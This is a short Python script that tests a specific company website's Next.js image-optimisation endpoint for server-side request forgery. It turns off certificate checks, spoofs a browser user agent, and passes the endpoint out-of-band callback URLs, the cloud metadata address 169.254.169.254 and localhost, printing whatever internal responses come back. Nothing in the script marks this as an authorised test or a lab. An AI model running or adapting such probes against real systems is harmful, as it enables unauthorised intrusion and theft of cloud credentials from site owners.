import urllib.request, urllib.parse, ssl, time, json
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
B="https://www.infinitycapital.bh/_next/image"
def hit(label,url):
    t=time.time()
    try:
        r=urllib.request.Request(url,headers={"User-Agent":UA})
        with urllib.request.urlopen(r,timeout=25,context=ctx) as resp:
            body=resp.read()
            print(f"{label:16} {resp.status} {len(body)} {resp.headers.get('content-type')} {time.time()-t:.1f}s")
            return body
    except Exception as e:
        code=getattr(e,'code',None)
        body=b''
        try: body=e.read()
        except: pass
        print(f"{label:16} ERR {code} {len(body)} {str(e)[:80]} {time.time()-t:.1f}s")
        return body

targets={
 "oob1":"http://oob13ea9b3e7a40.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf",
 "oob2":"http://oobebbc11b8ce9f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf",
 "metadata":"http://169.254.169.254/latest/meta-data/",
 "localhost":"http://127.0.0.1:3000/",
 "self":"https://www.infinitycapital.bh/favicon.ico",
 "ctf":"https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg",
}
for k,v in targets.items():
    u=B+"?url="+urllib.parse.quote(v,safe="")+"&w=640&q=75"
    b=hit(k,u)
    if k in ("metadata","localhost","self") and b:
        print("   BODY:",b[:200])
